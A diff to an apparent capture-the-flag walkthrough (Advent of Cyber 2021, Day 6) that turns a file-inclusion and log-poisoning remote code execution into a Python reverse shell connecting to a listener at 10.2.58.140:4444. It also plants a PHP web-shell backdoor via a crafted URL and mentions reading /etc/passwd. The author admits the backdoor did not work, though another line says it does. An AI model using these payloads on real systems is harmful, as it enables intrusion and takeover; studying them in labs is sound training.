@@ -223,14 +223,46 @@ Not only was our text executed, but we got a **good** error. The error tells us 
 
 Confirmed, full **RCE**. We have user interaction as `www-data`. You can now run any type of command you want that the server has access to, like `cat /etc/passwd`. 
 
+So how about full compromise? Since we have access to the command line via a browser, we can enumerate the available binaries. I tried `wget`, `nc`, `python3`, `curl`, and finally landed on `python` as a command available to the user `www-data`. Bingo, we can find a reverse shell with `python`. 
+
+![which python](AoC-2021_Photos/Day_6/24.0_AoC-Day-6_12-24-21-Which-Python.png)
+
+[Payload all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) has some great tools on there, one of them being a [python_reverse_shell](../../../exploits/reverse_shells/python/python_reverse_shell.py) that works on this system (after several tries). With some quick modifications, and a listener on our hots machine, we can obtain a semi-stable shell. 
+
+***On your host machine***
+```
+ip a # To find the tun0 IP
+
+nc -lvnp 4444
+```
+
+***In the target URL after `&cmd=`***
+```
+python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.2.58.140",4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
+```
+
+***Full command in the URL***
+```
+http://aoc6.com/index.php?err=php://filter/resource=../../../../../../var/www/html/includes/logs/app_access.log&cmd=python%20-c%20%27a=__import__;b=a(%22socket%22);p=a(%22subprocess%22).call;o=a(%22os%22).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((%2210.2.58.140%22,4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([%22/bin/sh%22,%22-i%22])%27
+```
+
+And we have an interactive shell. 
+
+![Interactive Shell](AoC-2021_Photos/Day_6/25.0_AoC-Day-6_12-24-21-Reverse-ShellComplete.png)
+
+Congratulations on completing the box! We were not required to get a reverse shell on the box, but from here, we can continue to solve the bonus challenge if you'd like. 
+
+### Bonus
+##### Extra
+> I could not get the command below to work. The file `backdoor.php` was created, but I cannot seem to access the code. I have tried URL-encoding the payload to no avail. Maybe you can get it to work?
+
+
 This is really messy, however. Let's create our own back door file. Instead of `whoami`, take the `PHP` code we curled and paste in the entire custom `User-Agent` portion, omitting the `\` that escapes the `$` because we don't need it in the URL. Wrap this code in an `echo '<CODE>'` statement, and use the *redirect* function to create a new file on the web root with `> backdoor.php`. Your full URL, including the statement, is below:
 
 `http://aoc6.com/index.php?err=php://filter/resource=./includes/logs/app_access.log&cmd=echo '<php? echo 'n0_ware on your server    ';system($_GET['cmd']);?>' > backdoor.php`
 
+Navigate to the webroot `aoc6.com/backdoor.php` and run any command you'd like with `&=COMMAND`. 
 
-> The extra spaces are intentional
-
-NONE OF THESE THINGS WORKED SO RCE WITH
 
 ```
 python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.2.58.140",4444));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
